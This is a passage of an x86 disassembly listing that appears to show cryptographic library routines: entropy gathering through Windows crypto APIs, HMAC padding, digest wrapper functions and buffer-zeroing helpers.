  40692c:	8d 44 24 18          	lea    0x18(%esp),%eax
  406930:	50                   	push   %eax
  406931:	8d 47 20             	lea    0x20(%edi),%eax
  406934:	50                   	push   %eax
  406935:	e8 7d bf ff ff       	call   0x4028b7
  40693a:	6a 10                	push   $0x10
  40693c:	8d 44 24 38          	lea    0x38(%esp),%eax
  406940:	50                   	push   %eax
  406941:	57                   	push   %edi
  406942:	e8 de bc ff ff       	call   0x402625
  406947:	83 c4 0c             	add    $0xc,%esp
  40694a:	33 c0                	xor    %eax,%eax
  40694c:	5f                   	pop    %edi
  40694d:	5e                   	pop    %esi
  40694e:	5d                   	pop    %ebp
  40694f:	5b                   	pop    %ebx
  406950:	83 c4 34             	add    $0x34,%esp
  406953:	c2 08 00             	ret    $0x8
  406956:	68 00 02 00 00       	push   $0x200
  40695b:	6a 00                	push   $0x0
  40695d:	ff 74 24 0c          	push   0xc(%esp)
  406961:	e8 e1 bc ff ff       	call   0x402647
  406966:	83 c4 0c             	add    $0xc,%esp
  406969:	6a 00                	push   $0x0
  40696b:	ff 74 24 08          	push   0x8(%esp)
  40696f:	e8 0f 13 00 00       	call   0x407c83
  406974:	6a 01                	push   $0x1
  406976:	6a 20                	push   $0x20
  406978:	6a 00                	push   $0x0
  40697a:	68 ce 6b 40 00       	push   $0x406bce
  40697f:	ff 74 24 14          	push   0x14(%esp)
  406983:	e8 14 00 00 00       	call   0x40699c
  406988:	c2 04 00             	ret    $0x4
  40698b:	68 00 02 00 00       	push   $0x200
  406990:	ff 74 24 08          	push   0x8(%esp)
  406994:	e8 42 01 00 00       	call   0x406adb
  406999:	c2 04 00             	ret    $0x4
  40699c:	55                   	push   %ebp
  40699d:	8b ec                	mov    %esp,%ebp
  40699f:	56                   	push   %esi
  4069a0:	8b 75 08             	mov    0x8(%ebp),%esi
  4069a3:	57                   	push   %edi
  4069a4:	33 ff                	xor    %edi,%edi
  4069a6:	8b 46 6c             	mov    0x6c(%esi),%eax
  4069a9:	83 f8 14             	cmp    $0x14,%eax
  4069ac:	7c 05                	jl     0x4069b3
  4069ae:	6a c2                	push   $0xffffffc2
  4069b0:	5f                   	pop    %edi
  4069b1:	eb 25                	jmp    0x4069d8
  4069b3:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4069b6:	6b d0 14             	imul   $0x14,%eax,%edx
  4069b9:	8b 45 0c             	mov    0xc(%ebp),%eax
  4069bc:	89 4c 32 74          	mov    %ecx,0x74(%edx,%esi,1)
  4069c0:	8b 4d 14             	mov    0x14(%ebp),%ecx
  4069c3:	89 4c 32 7c          	mov    %ecx,0x7c(%edx,%esi,1)
  4069c7:	8b 4d 18             	mov    0x18(%ebp),%ecx
  4069ca:	89 44 32 70          	mov    %eax,0x70(%edx,%esi,1)
  4069ce:	89 8c 32 80 00 00 00 	mov    %ecx,0x80(%edx,%esi,1)
  4069d5:	ff 46 6c             	incl   0x6c(%esi)
  4069d8:	8b c7                	mov    %edi,%eax
  4069da:	5f                   	pop    %edi
  4069db:	5e                   	pop    %esi
  4069dc:	5d                   	pop    %ebp
  4069dd:	c2 14 00             	ret    $0x14
  4069e0:	e9 5d 01 00 00       	jmp    0x406b42
  4069e5:	83 ec 20             	sub    $0x20,%esp
  4069e8:	55                   	push   %ebp
  4069e9:	33 ed                	xor    %ebp,%ebp
  4069eb:	83 7c 24 30 20       	cmpl   $0x20,0x30(%esp)
  4069f0:	57                   	push   %edi
  4069f1:	8b fd                	mov    %ebp,%edi
  4069f3:	76 08                	jbe    0x4069fd
  4069f5:	6a c4                	push   $0xffffffc4
  4069f7:	58                   	pop    %eax
  4069f8:	e9 c0 00 00 00       	jmp    0x406abd
  4069fd:	53                   	push   %ebx
  4069fe:	56                   	push   %esi
  4069ff:	8b 74 24 34          	mov    0x34(%esp),%esi
  406a03:	8b c7                	mov    %edi,%eax
  406a05:	47                   	inc    %edi
  406a06:	3d 00 01 00 00       	cmp    $0x100,%eax
  406a0b:	0f 8f a7 00 00 00    	jg     0x406ab8
  406a11:	56                   	push   %esi
  406a12:	e8 2b 01 00 00       	call   0x406b42
  406a17:	85 c0                	test   %eax,%eax
  406a19:	0f 85 9c 00 00 00    	jne    0x406abb
  406a1f:	8b 4e 6c             	mov    0x6c(%esi),%ecx
  406a22:	33 d2                	xor    %edx,%edx
  406a24:	42                   	inc    %edx
  406a25:	85 c9                	test   %ecx,%ecx
  406a27:	7e 18                	jle    0x406a41
  406a29:	8d 5e 7c             	lea    0x7c(%esi),%ebx
  406a2c:	8b 43 fc             	mov    -0x4(%ebx),%eax
  406a2f:	3b 03                	cmp    (%ebx),%eax
  406a31:	8d 5b 14             	lea    0x14(%ebx),%ebx
  406a34:	1b c0                	sbb    %eax,%eax
  406a36:	f7 d0                	not    %eax
  406a38:	23 d0                	and    %eax,%edx
  406a3a:	49                   	dec    %ecx
  406a3b:	75 ef                	jne    0x406a2c
  406a3d:	85 d2                	test   %edx,%edx
  406a3f:	74 c2                	je     0x406a03
  406a41:	6a 20                	push   $0x20
  406a43:	8d 44 24 14          	lea    0x14(%esp),%eax
  406a47:	55                   	push   %ebp
  406a48:	50                   	push   %eax
  406a49:	e8 f9 bb ff ff       	call   0x402647
  406a4e:	83 c4 0c             	add    $0xc,%esp
  406a51:	8d 44 24 10          	lea    0x10(%esp),%eax
  406a55:	50                   	push   %eax
  406a56:	56                   	push   %esi
  406a57:	e8 5e 13 00 00       	call   0x407dba
  406a5c:	6a 6c                	push   $0x6c
  406a5e:	55                   	push   %ebp
  406a5f:	56                   	push   %esi
  406a60:	e8 e2 bb ff ff       	call   0x402647
  406a65:	83 c4 0c             	add    $0xc,%esp
  406a68:	55                   	push   %ebp
  406a69:	56                   	push   %esi
  406a6a:	e8 14 12 00 00       	call   0x407c83
  406a6f:	6a 20                	push   $0x20
  406a71:	8d 44 24 14          	lea    0x14(%esp),%eax
  406a75:	50                   	push   %eax
  406a76:	56                   	push   %esi
  406a77:	e8 92 12 00 00       	call   0x407d0e
  406a7c:	55                   	push   %ebp
  406a7d:	8d 44 24 14          	lea    0x14(%esp),%eax
  406a81:	50                   	push   %eax
  406a82:	6a 20                	push   $0x20
  406a84:	50                   	push   %eax
  406a85:	e8 6a 1e 00 00       	call   0x4088f4
  406a8a:	8b cd                	mov    %ebp,%ecx
  406a8c:	39 6e 6c             	cmp    %ebp,0x6c(%esi)
  406a8f:	7e 0e                	jle    0x406a9f
  406a91:	8d 46 78             	lea    0x78(%esi),%eax
  406a94:	89 28                	mov    %ebp,(%eax)
  406a96:	41                   	inc    %ecx
  406a97:	8d 40 14             	lea    0x14(%eax),%eax
  406a9a:	3b 4e 6c             	cmp    0x6c(%esi),%ecx
  406a9d:	7c f5                	jl     0x406a94
  406a9f:	ff 74 24 3c          	push   0x3c(%esp)
  406aa3:	8d 44 24 14          	lea    0x14(%esp),%eax
  406aa7:	50                   	push   %eax
  406aa8:	ff 74 24 40          	push   0x40(%esp)
  406aac:	e8 74 bb ff ff       	call   0x402625
  406ab1:	83 c4 0c             	add    $0xc,%esp
  406ab4:	8b c5                	mov    %ebp,%eax
  406ab6:	eb 03                	jmp    0x406abb
  406ab8:	6a c4                	push   $0xffffffc4
  406aba:	58                   	pop    %eax
  406abb:	5e                   	pop    %esi
  406abc:	5b                   	pop    %ebx
  406abd:	5f                   	pop    %edi
  406abe:	5d                   	pop    %ebp
  406abf:	83 c4 20             	add    $0x20,%esp
  406ac2:	c2 0c 00             	ret    $0xc
  406ac5:	ff 74 24 0c          	push   0xc(%esp)
  406ac9:	ff 74 24 0c          	push   0xc(%esp)
  406acd:	6a 14                	push   $0x14
  406acf:	ff 74 24 10          	push   0x10(%esp)
  406ad3:	e8 19 00 00 00       	call   0x406af1
  406ad8:	c2 0c 00             	ret    $0xc
  406adb:	8b 44 24 08          	mov    0x8(%esp),%eax
  406adf:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  406ae3:	85 c0                	test   %eax,%eax
  406ae5:	74 07                	je     0x406aee
  406ae7:	c6 01 00             	movb   $0x0,(%ecx)
  406aea:	41                   	inc    %ecx
  406aeb:	48                   	dec    %eax
  406aec:	75 f9                	jne    0x406ae7
  406aee:	c2 08 00             	ret    $0x8
  406af1:	55                   	push   %ebp
  406af2:	8b ec                	mov    %esp,%ebp
  406af4:	83 ec 20             	sub    $0x20,%esp
  406af7:	53                   	push   %ebx
  406af8:	8b 5d 14             	mov    0x14(%ebp),%ebx
  406afb:	56                   	push   %esi
  406afc:	8b 75 10             	mov    0x10(%ebp),%esi
  406aff:	83 fb 20             	cmp    $0x20,%ebx
  406b02:	76 13                	jbe    0x406b17
  406b04:	6a 00                	push   $0x0
  406b06:	8d 45 e0             	lea    -0x20(%ebp),%eax
  406b09:	50                   	push   %eax
  406b0a:	53                   	push   %ebx
  406b0b:	56                   	push   %esi
  406b0c:	e8 e3 1d 00 00       	call   0x4088f4
  406b11:	6a 20                	push   $0x20
  406b13:	8d 75 e0             	lea    -0x20(%ebp),%esi
  406b16:	5b                   	pop    %ebx
  406b17:	8b 45 0c             	mov    0xc(%ebp),%eax
  406b1a:	88 45 14             	mov    %al,0x14(%ebp)
  406b1d:	8d 45 14             	lea    0x14(%ebp),%eax
  406b20:	6a 02                	push   $0x2
  406b22:	50                   	push   %eax
  406b23:	ff 75 08             	push   0x8(%ebp)
  406b26:	88 5d 15             	mov    %bl,0x15(%ebp)
  406b29:	e8 e0 11 00 00       	call   0x407d0e
  406b2e:	53                   	push   %ebx
  406b2f:	56                   	push   %esi
  406b30:	ff 75 08             	push   0x8(%ebp)
  406b33:	e8 d6 11 00 00       	call   0x407d0e
  406b38:	5e                   	pop    %esi
  406b39:	33 c0                	xor    %eax,%eax
  406b3b:	5b                   	pop    %ebx
  406b3c:	8b e5                	mov    %ebp,%esp
  406b3e:	5d                   	pop    %ebp
  406b3f:	c2 10 00             	ret    $0x10
  406b42:	81 ec 84 00 00 00    	sub    $0x84,%esp
  406b48:	55                   	push   %ebp
  406b49:	57                   	push   %edi
  406b4a:	8b bc 24 90 00 00 00 	mov    0x90(%esp),%edi
  406b51:	33 ed                	xor    %ebp,%ebp
  406b53:	8b 47 6c             	mov    0x6c(%edi),%eax
  406b56:	85 c0                	test   %eax,%eax
  406b58:	75 05                	jne    0x406b5f
  406b5a:	6a c0                	push   $0xffffffc0
  406b5c:	58                   	pop    %eax
  406b5d:	eb 64                	jmp    0x406bc3
  406b5f:	53                   	push   %ebx
  406b60:	33 db                	xor    %ebx,%ebx
  406b62:	56                   	push   %esi
  406b63:	85 c0                	test   %eax,%eax
  406b65:	7e 57                	jle    0x406bbe
  406b67:	8d 77 70             	lea    0x70(%edi),%esi
  406b6a:	83 7e 10 01          	cmpl   $0x1,0x10(%esi)
  406b6e:	75 03                	jne    0x406b73
  406b70:	33 ed                	xor    %ebp,%ebp
  406b72:	45                   	inc    %ebp
  406b73:	83 64 24 10 00       	andl   $0x0,0x10(%esp)
  406b78:	8d 44 24 10          	lea    0x10(%esp),%eax
  406b7c:	50                   	push   %eax
  406b7d:	68 80 00 00 00       	push   $0x80
  406b82:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  406b86:	50                   	push   %eax
  406b87:	ff 76 04             	push   0x4(%esi)
  406b8a:	ff 16                	call   *(%esi)
  406b8c:	85 c0                	test   %eax,%eax
  406b8e:	75 31                	jne    0x406bc1
  406b90:	39 44 24 10          	cmp    %eax,0x10(%esp)
  406b94:	76 17                	jbe    0x406bad
  406b96:	ff 74 24 10          	push   0x10(%esp)
  406b9a:	8d 44 24 18          	lea    0x18(%esp),%eax
  406b9e:	50                   	push   %eax
  406b9f:	53                   	push   %ebx
  406ba0:	57                   	push   %edi
  406ba1:	e8 4b ff ff ff       	call   0x406af1
  406ba6:	8b 44 24 10          	mov    0x10(%esp),%eax
  406baa:	01 46 08             	add    %eax,0x8(%esi)
  406bad:	43                   	inc    %ebx
  406bae:	83 c6 14             	add    $0x14,%esi
  406bb1:	3b 5f 6c             	cmp    0x6c(%edi),%ebx
  406bb4:	7c b4                	jl     0x406b6a
  406bb6:	85 ed                	test   %ebp,%ebp
  406bb8:	74 04                	je     0x406bbe
  406bba:	33 c0                	xor    %eax,%eax
  406bbc:	eb 03                	jmp    0x406bc1
  406bbe:	6a c3                	push   $0xffffffc3
  406bc0:	58                   	pop    %eax
  406bc1:	5e                   	pop    %esi
  406bc2:	5b                   	pop    %ebx
  406bc3:	5f                   	pop    %edi
  406bc4:	5d                   	pop    %ebp
  406bc5:	81 c4 84 00 00 00    	add    $0x84,%esp
  406bcb:	c2 04 00             	ret    $0x4
  406bce:	55                   	push   %ebp
  406bcf:	8b ec                	mov    %esp,%ebp
  406bd1:	53                   	push   %ebx
  406bd2:	57                   	push   %edi
  406bd3:	8b 7d 14             	mov    0x14(%ebp),%edi
  406bd6:	8d 45 14             	lea    0x14(%ebp),%eax
  406bd9:	68 00 00 00 f0       	push   $0xf0000000
  406bde:	6a 01                	push   $0x1
  406be0:	33 db                	xor    %ebx,%ebx
  406be2:	53                   	push   %ebx
  406be3:	53                   	push   %ebx
  406be4:	50                   	push   %eax
  406be5:	89 1f                	mov    %ebx,(%edi)
  406be7:	ff 15 18 10 40 00    	call   *0x401018
  406bed:	85 c0                	test   %eax,%eax
  406bef:	75 05                	jne    0x406bf6
  406bf1:	6a c4                	push   $0xffffffc4
  406bf3:	58                   	pop    %eax
  406bf4:	eb 2f                	jmp    0x406c25
  406bf6:	56                   	push   %esi
  406bf7:	ff 75 0c             	push   0xc(%ebp)
  406bfa:	8b 75 10             	mov    0x10(%ebp),%esi
  406bfd:	56                   	push   %esi
  406bfe:	ff 75 14             	push   0x14(%ebp)
  406c01:	ff 15 10 10 40 00    	call   *0x401010
  406c07:	53                   	push   %ebx
  406c08:	ff 75 14             	push   0x14(%ebp)
  406c0b:	85 c0                	test   %eax,%eax
  406c0d:	75 0b                	jne    0x406c1a
  406c0f:	ff 15 14 10 40 00    	call   *0x401014
  406c15:	6a c4                	push   $0xffffffc4
  406c17:	58                   	pop    %eax
  406c18:	eb 0a                	jmp    0x406c24
  406c1a:	ff 15 14 10 40 00    	call   *0x401014
  406c20:	89 37                	mov    %esi,(%edi)
  406c22:	33 c0                	xor    %eax,%eax
  406c24:	5e                   	pop    %esi
  406c25:	5f                   	pop    %edi
  406c26:	5b                   	pop    %ebx
  406c27:	5d                   	pop    %ebp
  406c28:	c2 10 00             	ret    $0x10
  406c2b:	b8 00 1c 40 00       	mov    $0x401c00,%eax
  406c30:	c3                   	ret
  406c31:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  406c36:	74 35                	je     0x406c6d
  406c38:	ff 74 24 04          	push   0x4(%esp)
  406c3c:	68 0c 1c 40 00       	push   $0x401c0c
  406c41:	e8 2f ba ff ff       	call   0x402675
  406c46:	59                   	pop    %ecx
  406c47:	59                   	pop    %ecx
  406c48:	85 c0                	test   %eax,%eax
  406c4a:	75 09                	jne    0x406c55
  406c4c:	6a 05                	push   $0x5
  406c4e:	e8 1f 00 00 00       	call   0x406c72
  406c53:	eb 1a                	jmp    0x406c6f
  406c55:	ff 74 24 04          	push   0x4(%esp)
  406c59:	68 14 1c 40 00       	push   $0x401c14
  406c5e:	e8 12 ba ff ff       	call   0x402675
  406c63:	59                   	pop    %ecx
  406c64:	59                   	pop    %ecx
  406c65:	85 c0                	test   %eax,%eax
  406c67:	75 04                	jne    0x406c6d
  406c69:	6a 06                	push   $0x6
  406c6b:	eb e1                	jmp    0x406c4e
  406c6d:	33 c0                	xor    %eax,%eax
  406c6f:	c2 04 00             	ret    $0x4
  406c72:	8b 44 24 04          	mov    0x4(%esp),%eax
  406c76:	83 e8 05             	sub    $0x5,%eax
  406c79:	74 0e                	je     0x406c89
  406c7b:	48                   	dec    %eax
  406c7c:	74 04                	je     0x406c82
  406c7e:	33 c0                	xor    %eax,%eax
  406c80:	eb 0c                	jmp    0x406c8e
  406c82:	b8 4c 1c 40 00       	mov    $0x401c4c,%eax
  406c87:	eb 05                	jmp    0x406c8e
  406c89:	b8 1c 1c 40 00       	mov    $0x401c1c,%eax
  406c8e:	c2 04 00             	ret    $0x4
  406c91:	6a 0c                	push   $0xc
  406c93:	6a 00                	push   $0x0
  406c95:	ff 74 24 0c          	push   0xc(%esp)
  406c99:	e8 a9 b9 ff ff       	call   0x402647
  406c9e:	83 c4 0c             	add    $0xc,%esp
  406ca1:	c2 04 00             	ret    $0x4
  406ca4:	56                   	push   %esi
  406ca5:	8b 74 24 08          	mov    0x8(%esp),%esi
  406ca9:	85 f6                	test   %esi,%esi
  406cab:	74 39                	je     0x406ce6
  406cad:	8b 06                	mov    (%esi),%eax
  406caf:	85 c0                	test   %eax,%eax
  406cb1:	74 33                	je     0x406ce6
  406cb3:	83 7e 04 00          	cmpl   $0x0,0x4(%esi)
  406cb7:	74 06                	je     0x406cbf
  406cb9:	ff 76 04             	push   0x4(%esi)
  406cbc:	ff 50 24             	call   *0x24(%eax)
  406cbf:	83 7e 08 00          	cmpl   $0x0,0x8(%esi)
  406cc3:	74 19                	je     0x406cde
  406cc5:	8b 06                	mov    (%esi),%eax
  406cc7:	8b 40 0c             	mov    0xc(%eax),%eax
  406cca:	03 c0                	add    %eax,%eax
  406ccc:	50                   	push   %eax
  406ccd:	ff 76 08             	push   0x8(%esi)
  406cd0:	e8 8d 03 00 00       	call   0x407062
  406cd5:	ff 76 08             	push   0x8(%esi)
  406cd8:	e8 88 ba ff ff       	call   0x402765
  406cdd:	59                   	pop    %ecx
  406cde:	6a 0c                	push   $0xc
  406ce0:	56                   	push   %esi
  406ce1:	e8 7c 03 00 00       	call   0x407062
  406ce6:	5e                   	pop    %esi
  406ce7:	c2 04 00             	ret    $0x4
  406cea:	53                   	push   %ebx
  406ceb:	56                   	push   %esi
  406cec:	8b 74 24 10          	mov    0x10(%esp),%esi
  406cf0:	57                   	push   %edi
  406cf1:	85 f6                	test   %esi,%esi
  406cf3:	74 41                	je     0x406d36
  406cf5:	8b 7c 24 10          	mov    0x10(%esp),%edi
  406cf9:	85 ff                	test   %edi,%edi
  406cfb:	74 39                	je     0x406d36
  406cfd:	ff 56 20             	call   *0x20(%esi)
  406d00:	8b d8                	mov    %eax,%ebx
  406d02:	89 5f 04             	mov    %ebx,0x4(%edi)
  406d05:	85 db                	test   %ebx,%ebx
  406d07:	75 07                	jne    0x406d10
  406d09:	b8 80 ae ff ff       	mov    $0xffffae80,%eax
  406d0e:	eb 2b                	jmp    0x406d3b
  406d10:	83 7c 24 18 00       	cmpl   $0x0,0x18(%esp)
  406d15:	74 19                	je     0x406d30
  406d17:	ff 76 0c             	push   0xc(%esi)
  406d1a:	6a 02                	push   $0x2
  406d1c:	e8 2a ba ff ff       	call   0x40274b
  406d21:	89 47 08             	mov    %eax,0x8(%edi)
  406d24:	59                   	pop    %ecx
  406d25:	59                   	pop    %ecx
  406d26:	85 c0                	test   %eax,%eax
  406d28:	75 06                	jne    0x406d30
  406d2a:	53                   	push   %ebx
  406d2b:	ff 56 24             	call   *0x24(%esi)
  406d2e:	eb d9                	jmp    0x406d09
  406d30:	89 37                	mov    %esi,(%edi)
  406d32:	33 c0                	xor    %eax,%eax
  406d34:	eb 05                	jmp    0x406d3b
  406d36:	b8 00 af ff ff       	mov    $0xffffaf00,%eax
  406d3b:	5f                   	pop    %edi
  406d3c:	5e                   	pop    %esi
  406d3d:	5b                   	pop    %ebx
  406d3e:	c2 0c 00             	ret    $0xc
  406d41:	8b 44 24 04          	mov    0x4(%esp),%eax
  406d45:	85 c0                	test   %eax,%eax
  406d47:	74 24                	je     0x406d6d
  406d49:	8b 08                	mov    (%eax),%ecx
  406d4b:	85 c9                	test   %ecx,%ecx
  406d4d:	74 1e                	je     0x406d6d
  406d4f:	8b 54 24 08          	mov    0x8(%esp),%edx
  406d53:	85 d2                	test   %edx,%edx
  406d55:	74 16                	je     0x406d6d
  406d57:	83 3a 00             	cmpl   $0x0,(%edx)
  406d5a:	74 11                	je     0x406d6d
  406d5c:	3b 0a                	cmp    (%edx),%ecx
  406d5e:	75 0d                	jne    0x406d6d
  406d60:	ff 72 04             	push   0x4(%edx)
  406d63:	ff 70 04             	push   0x4(%eax)
  406d66:	ff 51 28             	call   *0x28(%ecx)
  406d69:	33 c0                	xor    %eax,%eax
  406d6b:	eb 05                	jmp    0x406d72
  406d6d:	b8 00 af ff ff       	mov    $0xffffaf00,%eax
  406d72:	c2 08 00             	ret    $0x8
  406d75:	8b 44 24 04          	mov    0x4(%esp),%eax
  406d79:	85 c0                	test   %eax,%eax
  406d7b:	75 04                	jne    0x406d81
  406d7d:	32 c0                	xor    %al,%al
  406d7f:	eb 03                	jmp    0x406d84
  406d81:	8a 40 08             	mov    0x8(%eax),%al
  406d84:	c2 04 00             	ret    $0x4
  406d87:	8b 44 24 04          	mov    0x4(%esp),%eax
  406d8b:	85 c0                	test   %eax,%eax
  406d8d:	74 02                	je     0x406d91
  406d8f:	8b 00                	mov    (%eax),%eax
  406d91:	c2 04 00             	ret    $0x4
  406d94:	8b 44 24 04          	mov    0x4(%esp),%eax
  406d98:	85 c0                	test   %eax,%eax
  406d9a:	74 03                	je     0x406d9f
  406d9c:	8b 40 04             	mov    0x4(%eax),%eax
  406d9f:	c2 04 00             	ret    $0x4
  406da2:	8b 44 24 04          	mov    0x4(%esp),%eax
  406da6:	85 c0                	test   %eax,%eax
  406da8:	74 10                	je     0x406dba
  406daa:	8b 08                	mov    (%eax),%ecx
  406dac:	85 c9                	test   %ecx,%ecx
  406dae:	74 0a                	je     0x406dba
  406db0:	ff 70 04             	push   0x4(%eax)
  406db3:	ff 51 10             	call   *0x10(%ecx)
  406db6:	33 c0                	xor    %eax,%eax
  406db8:	eb 05                	jmp    0x406dbf
  406dba:	b8 00 af ff ff       	mov    $0xffffaf00,%eax
  406dbf:	c2 04 00             	ret    $0x4
  406dc2:	8b 44 24 04          	mov    0x4(%esp),%eax
  406dc6:	85 c0                	test   %eax,%eax
  406dc8:	74 18                	je     0x406de2
  406dca:	8b 08                	mov    (%eax),%ecx
  406dcc:	85 c9                	test   %ecx,%ecx
  406dce:	74 12                	je     0x406de2
  406dd0:	ff 74 24 0c          	push   0xc(%esp)
  406dd4:	ff 74 24 0c          	push   0xc(%esp)
  406dd8:	ff 70 04             	push   0x4(%eax)
  406ddb:	ff 51 14             	call   *0x14(%ecx)
  406dde:	33 c0                	xor    %eax,%eax
  406de0:	eb 05                	jmp    0x406de7
  406de2:	b8 00 af ff ff       	mov    $0xffffaf00,%eax
  406de7:	c2 0c 00             	ret    $0xc
  406dea:	8b 44 24 04          	mov    0x4(%esp),%eax
  406dee:	85 c0                	test   %eax,%eax
  406df0:	74 14                	je     0x406e06
  406df2:	8b 08                	mov    (%eax),%ecx
  406df4:	85 c9                	test   %ecx,%ecx
  406df6:	74 0e                	je     0x406e06
  406df8:	ff 74 24 08          	push   0x8(%esp)
  406dfc:	ff 70 04             	push   0x4(%eax)
  406dff:	ff 51 18             	call   *0x18(%ecx)
  406e02:	33 c0                	xor    %eax,%eax
  406e04:	eb 05                	jmp    0x406e0b
  406e06:	b8 00 af ff ff       	mov    $0xffffaf00,%eax
  406e0b:	c2 08 00             	ret    $0x8
  406e0e:	8b 44 24 04          	mov    0x4(%esp),%eax
  406e12:	85 c0                	test   %eax,%eax
  406e14:	75 07                	jne    0x406e1d
  406e16:	b8 00 af ff ff       	mov    $0xffffaf00,%eax
  406e1b:	eb 11                	jmp    0x406e2e
  406e1d:	ff 74 24 10          	push   0x10(%esp)
  406e21:	ff 74 24 10          	push   0x10(%esp)
  406e25:	ff 74 24 10          	push   0x10(%esp)
  406e29:	ff 50 1c             	call   *0x1c(%eax)
  406e2c:	33 c0                	xor    %eax,%eax
  406e2e:	c2 10 00             	ret    $0x10
  406e31:	83 ec 20             	sub    $0x20,%esp
  406e34:	56                   	push   %esi
  406e35:	8b 74 24 28          	mov    0x28(%esp),%esi
  406e39:	85 f6                	test   %esi,%esi
  406e3b:	0f 84 b9 00 00 00    	je     0x406efa
  406e41:	8b 06                	mov    (%esi),%eax
  406e43:	85 c0                	test   %eax,%eax
  406e45:	0f 84 af 00 00 00    	je     0x406efa
  406e4b:	83 7e 08 00          	cmpl   $0x0,0x8(%esi)
  406e4f:	0f 84 a5 00 00 00    	je     0x406efa
  406e55:	53                   	push   %ebx
  406e56:	8b 5c 24 34          	mov    0x34(%esp),%ebx
  406e5a:	55                   	push   %ebp
  406e5b:	57                   	push   %edi
  406e5c:	3b 58 0c             	cmp    0xc(%eax),%ebx
  406e5f:	76 2b                	jbe    0x406e8c
  406e61:	ff 76 04             	push   0x4(%esi)
  406e64:	ff 50 10             	call   *0x10(%eax)
  406e67:	8b 06                	mov    (%esi),%eax
  406e69:	53                   	push   %ebx
  406e6a:	ff 74 24 3c          	push   0x3c(%esp)
  406e6e:	ff 76 04             	push   0x4(%esi)
  406e71:	ff 50 14             	call   *0x14(%eax)
  406e74:	8b 06                	mov    (%esi),%eax
  406e76:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  406e7a:	51                   	push   %ecx
  406e7b:	ff 76 04             	push   0x4(%esi)
  406e7e:	ff 50 18             	call   *0x18(%eax)
  406e81:	8b 06                	mov    (%esi),%eax
  406e83:	8d 7c 24 10          	lea    0x10(%esp),%edi
  406e87:	8b 58 08             	mov    0x8(%eax),%ebx
  406e8a:	eb 04                	jmp    0x406e90
  406e8c:	8b 7c 24 38          	mov    0x38(%esp),%edi
  406e90:	8b 4e 08             	mov    0x8(%esi),%ecx
  406e93:	8b 40 0c             	mov    0xc(%eax),%eax
  406e96:	50                   	push   %eax
  406e97:	6a 36                	push   $0x36
  406e99:	51                   	push   %ecx
  406e9a:	89 4c 24 44          	mov    %ecx,0x44(%esp)
  406e9e:	8d 2c 01             	lea    (%ecx,%eax,1),%ebp
  406ea1:	e8 a1 b7 ff ff       	call   0x402647
  406ea6:	8b 06                	mov    (%esi),%eax
  406ea8:	ff 70 0c             	push   0xc(%eax)
  406eab:	6a 5c                	push   $0x5c
  406ead:	55                   	push   %ebp
  406eae:	e8 94 b7 ff ff       	call   0x402647
  406eb3:	83 c4 18             	add    $0x18,%esp
  406eb6:	85 db                	test   %ebx,%ebx
  406eb8:	74 16                	je     0x406ed0
  406eba:	8b 4c 24 38          	mov    0x38(%esp),%ecx
  406ebe:	2b cf                	sub    %edi,%ecx
  406ec0:	2b ef                	sub    %edi,%ebp
  406ec2:	8a 07                	mov    (%edi),%al
  406ec4:	30 04 39             	xor    %al,(%ecx,%edi,1)
  406ec7:	8a 07                	mov    (%edi),%al
  406ec9:	30 04 2f             	xor    %al,(%edi,%ebp,1)
  406ecc:	47                   	inc    %edi
  406ecd:	4b                   	dec    %ebx
  406ece:	75 f2                	jne    0x406ec2
  406ed0:	6a 20                	push   $0x20
  406ed2:	8d 44 24 14          	lea    0x14(%esp),%eax
  406ed6:	50                   	push   %eax
  406ed7:	e8 86 01 00 00       	call   0x407062
  406edc:	8b 06                	mov    (%esi),%eax
  406ede:	ff 76 04             	push   0x4(%esi)
  406ee1:	ff 50 10             	call   *0x10(%eax)
  406ee4:	8b 06                	mov    (%esi),%eax
  406ee6:	ff 70 0c             	push   0xc(%eax)
  406ee9:	ff 74 24 3c          	push   0x3c(%esp)
  406eed:	ff 76 04             	push   0x4(%esi)
  406ef0:	ff 50 14             	call   *0x14(%eax)
  406ef3:	5f                   	pop    %edi
  406ef4:	5d                   	pop    %ebp
  406ef5:	33 c0                	xor    %eax,%eax
  406ef7:	5b                   	pop    %ebx
  406ef8:	eb 05                	jmp    0x406eff
  406efa:	b8 00 af ff ff       	mov    $0xffffaf00,%eax
  406eff:	5e                   	pop    %esi
  406f00:	83 c4 20             	add    $0x20,%esp
  406f03:	c2 0c 00             	ret    $0xc
  406f06:	8b 44 24 04          	mov    0x4(%esp),%eax
  406f0a:	85 c0                	test   %eax,%eax
  406f0c:	74 1e                	je     0x406f2c
  406f0e:	8b 08                	mov    (%eax),%ecx
  406f10:	85 c9                	test   %ecx,%ecx
  406f12:	74 18                	je     0x406f2c
  406f14:	83 78 08 00          	cmpl   $0x0,0x8(%eax)
  406f18:	74 12                	je     0x406f2c
  406f1a:	ff 74 24 0c          	push   0xc(%esp)
  406f1e:	ff 74 24 0c          	push   0xc(%esp)
  406f22:	ff 70 04             	push   0x4(%eax)
  406f25:	ff 51 14             	call   *0x14(%ecx)
  406f28:	33 c0                	xor    %eax,%eax
  406f2a:	eb 05                	jmp    0x406f31
  406f2c:	b8 00 af ff ff       	mov    $0xffffaf00,%eax
  406f31:	c2 0c 00             	ret    $0xc
  406f34:	55                   	push   %ebp
  406f35:	8b ec                	mov    %esp,%ebp
  406f37:	83 ec 20             	sub    $0x20,%esp
  406f3a:	57                   	push   %edi
  406f3b:	8b 7d 08             	mov    0x8(%ebp),%edi
  406f3e:	85 ff                	test   %edi,%edi
  406f40:	74 50                	je     0x406f92
  406f42:	8b 07                	mov    (%edi),%eax
  406f44:	85 c0                	test   %eax,%eax
  406f46:	74 4a                	je     0x406f92
  406f48:	83 7f 08 00          	cmpl   $0x0,0x8(%edi)
  406f4c:	74 44                	je     0x406f92
  406f4e:	56                   	push   %esi
  406f4f:	8b 70 0c             	mov    0xc(%eax),%esi
  406f52:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  406f55:	03 77 08             	add    0x8(%edi),%esi
  406f58:	51                   	push   %ecx
  406f59:	ff 77 04             	push   0x4(%edi)
  406f5c:	ff 50 18             	call   *0x18(%eax)
  406f5f:	8b 07                	mov    (%edi),%eax
  406f61:	ff 77 04             	push   0x4(%edi)
  406f64:	ff 50 10             	call   *0x10(%eax)
  406f67:	8b 07                	mov    (%edi),%eax
